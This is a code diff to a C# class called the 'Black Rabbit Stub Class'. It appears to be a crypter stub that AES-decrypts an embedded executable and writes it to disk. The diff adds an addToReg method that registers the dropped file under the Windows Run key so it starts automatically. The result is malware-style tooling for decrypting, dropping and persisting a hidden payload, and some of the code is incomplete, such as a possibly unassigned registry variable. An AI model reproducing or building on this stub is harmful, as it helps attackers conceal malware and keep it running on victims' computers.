@@ -2,27 +2,23 @@
 using System.Security.Cryptography;
 using System.IO;
 using System.Text;
+using Microsoft.Win32;
 
 /// <summary>
-/// Summary description for Class1
+/// Black Rabbit Stub Class
 /// </summary>
 public class brstub
 {
+    //variables
 
-    public byte[] Decrypted { get => decrypted; }
-    private byte[] decrypted = null;
-   
+    byte[] decrypted;
+    public byte[] Decrypted { get => decrypted; set => decrypted = value; }
 
-    public byte[] Key { get => key; set => key = value; }
-    public byte[] Iv { get => iv; set => iv = value; }
-    public byte[] Enc_exe { get => enc_exe; set => enc_exe = value; }
-
-    private byte[] key;
-    private byte[] iv;
-    private byte[] enc_exe;
-
-
-
+    enum regKeyType
+    {
+        CurrentUser,
+        LocalMachine
+    }
 
     //PRIVATE METHODS
 
@@ -149,7 +145,7 @@ public class brstub
     public byte[] encrypt(byte[] file, byte[] key, byte[] IV)
     {
         byte[] encrypted;
-    
+
 
         using (Aes aesecr = Aes.Create())
         {
@@ -183,10 +179,13 @@ public class brstub
 
 
     /// <summary>
-    /// Decrypt exe file .
+    /// Decrypt file.
     /// </summary>
+    /// <param name="encFile">Encrypted file as byte array.</param>
+    /// <param name="key">Key as byte array.</param>
+    /// <param name="IV">IV as byte array.</param>
     /// <returns>Byte array of decrypted file.</returns>
-    public byte[] decrypt()
+    public byte[] decrypt(byte[] encFile, byte[] key, byte[] IV)
     {
 
         
@@ -198,7 +197,7 @@ public class brstub
     
 
             aesdcr.Key = key;
-            aesdcr.IV = iv;
+            aesdcr.IV = IV;
 
             ICryptoTransform decryptor = aesdcr.CreateDecryptor(aesdcr.Key, aesdcr.IV);
 
@@ -236,28 +235,47 @@ public class brstub
             // Create a StringComparer an compare the hashes.
             StringComparer comparer = StringComparer.OrdinalIgnoreCase;
 
-            if (0 == comparer.Compare(hashOfInput, hash))
-            {
-                return true;
-            }
-            else
-            {
-                return false;
-            }
+            if (0 == comparer.Compare(hashOfInput, hash)) return true;
+            
+            else return false;
         }
     }
-    
+
     /// <summary>
     /// Save decrypted array to file
     /// </summary>
     /// <param name="path">Path to save file</param>
     /// <returns>Return true if file's exist ,false if isn't exist.</returns>
-    public bool saveFile(string path)
+    
+    public bool saveFile(string path )
     {
         File.WriteAllBytes(path, decrypted);
 
         if (File.Exists(path)) return true;
         else return false;
+    }
+
+    /// <summary>
+    /// Add seved file to autostart register.
+    /// </summary>
+    /// <param name="appName">App name in name field in register.</param>
+    /// <param name="path">Path to file to autostart.</param>
+    /// <param name="regKey">Switcher between CurrentUser key and LocalMachine key(administrator required). </param>
+    /// <returns></returns>
+    public void addToReg(string appName, string path, regKeyType regKey)
+    {
+        RegistryKey rkApp;
+
+        if (regKey == regKeyType.CurrentUser)
+        {
+            rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+        }
+        else if(regKey == regKeyType.LocalMachine)
+        {
+            rkApp = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+        }
+        rkApp.SetValue(appName, path);
+        rkApp.Close();
     }
     
 }
